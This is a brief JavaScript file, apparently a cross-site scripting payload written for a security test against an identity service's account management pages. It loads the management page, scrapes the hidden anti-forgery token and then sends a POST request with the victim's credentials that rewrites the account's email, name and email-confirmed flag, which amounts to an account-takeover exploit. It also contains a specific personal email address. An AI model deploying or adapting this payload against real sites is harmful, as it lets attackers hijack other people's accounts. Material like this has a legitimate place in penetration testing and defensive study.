var firstname = "Tara";
var lastname= "MyNewLastname";
var email= "True"
var emailaddress ="tara.owens@bridewell.com"
var host = "https://identity.cybiquity.io";
var manage = "/Manage";
var index = "/Manage/index";
var token="";
var create_params = "isEmailConfirmed=" + email +"&Email="+ emailaddress+"&FirstName=" + firstname + "&LastName=" + lastname + "&__RequestVerificationToken=" + token ;

function getToken() {
  fetch(host+index).then(function (response) {
  	console.log("resp-->"+ response.text());
	return response.text();
  }).then(function (html) {
  	console.log("here-->");
	var parser = new DOMParser();
	console.log("here2-->");
	var doc = parser.parseFromString(html, 'text/html');
	console.log("here3-->");
	token = document.querySelector('body > div.flex.flex-col.flex-auto.w-full.min-w-0 > div.flex.flex-col.flex-auto.relative > div > div > div > div.flex.flex-auto.overflow-hidden > div > form > input[type=hidden]:nth-child(6)').value;
	console.log("here4-->");
	console.log("tokengrabbed-->"+ token);
	send_modify();
	console.log("here5-->");
  }).catch(function (err) {
	xsswarn='Something went wrong.';
});
}

function send_modify() { 
  console.log("Modifying User..."); 
  fetch(host+manage, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response2) {
    isdone();
  }); 
}

function isdone() { 
  console.log("Done"); 
  
}

getToken();




